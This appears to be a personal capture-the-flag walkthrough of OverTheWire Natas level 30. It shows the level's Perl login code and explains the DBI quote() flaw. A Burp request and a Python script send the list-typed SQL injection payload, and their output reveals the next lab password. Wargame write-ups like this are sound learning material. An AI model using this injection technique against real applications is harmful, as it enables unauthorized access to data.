@@ -1,0 +1,159 @@
+PASSWORD WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
+
+http://natas30.natas.labs.overthewire.org/index.pl  <----------PARAMETER IS PEARL
+Username: admin
+Password: admin
+fail :(
+
+*VIEW SOURCECODE*
+/var/www/natas/natas30/index-source.pl
+
+#!/usr/bin/perl
+use CGI qw(:standard);
+use DBI;
+
+print <<END;
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+END
+
+if ('POST' eq request_method && param('username') && param('password')){
+    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
+    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 
+
+    my $sth = $dbh->prepare($query);
+    $sth->execute();
+    my $ver = $sth->fetch();
+    if ($ver){
+        print "win!<br>";
+        print "here is your result:<br>";
+        print @$ver;
+    }
+    else{
+        print "fail :(";
+    }
+    $sth->finish();
+    $dbh->disconnect();
+}
+
+print <<END;
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+END
+
+*PERL SQL INJECTION*
+There are 2 flaws with this in $dbh->quote(param('paramater'))
+
+Call a quote as a list with SQL_INTEGER as the second parameter, will return an unquoted value.
+
+> ! #define	SQL_NUMERIC		2
+> ! #define	SQL_DECIMAL		3
+> ! #define	SQL_INTEGER		4
+> ! #define	SQL_SMALLINT		5
+
+*BURP SUITE*
+*HTTP HISTORY*
+/INDEX.PL
+*SEND TO REPEATER*
+POST /index.pl HTTP/1.1
+Host: natas30.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Origin: http://natas30.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMDpXUWh4MUJ2Y21QOWlyczJNUDl0Um5Mc05hREk3NllySA==
+Connection: close
+Referer: http://natas30.natas.labs.overthewire.org/index.pl
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097
+Upgrade-Insecure-Requests: 1
+
+{"username"="natas31"&"password"=["'ra6narok' or 1", 4]}  <---------ADD SQL INJECTION LIST AND INTEGER*
+
+*SHOW RESPONSE IN BROWSER*
+http://natas30.natas.labs.overthewire.org/index.pl
+Username:
+Password:
+
+*NO *FAIL :(*
+
+*WRITE IT IN PYTHON SCRIPT*
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas]
+└─$ touch natas30.py 
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas]
+└─$ vim natas30.py
+
+import requests
+
+authentication = requests.auth.HTTPBasicAuth('natas30' , 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')
+
+url = "http://natas30.natas.labs.overthewire.org/index.pl"
+
+params = {"username":"natas31","password":["'ra6narok' or true",4]}
+
+response = requests.post(url,data=params, auth=authentication)
+
+print(response.text)
+
+*PRESS ESC*
+*TYPE :wq -TO SAVE AND QUIT*
+*PRESS ENTER*
+
+┌──(ra6narok㉿kali)-[~/Desktop/Natas]
+└─$ python natas30.py      
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
+<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
+
+<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->
+
+<h1>natas30</h1>
+<div id="content">
+
+<form action="index.pl" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y <---------PASSWORD
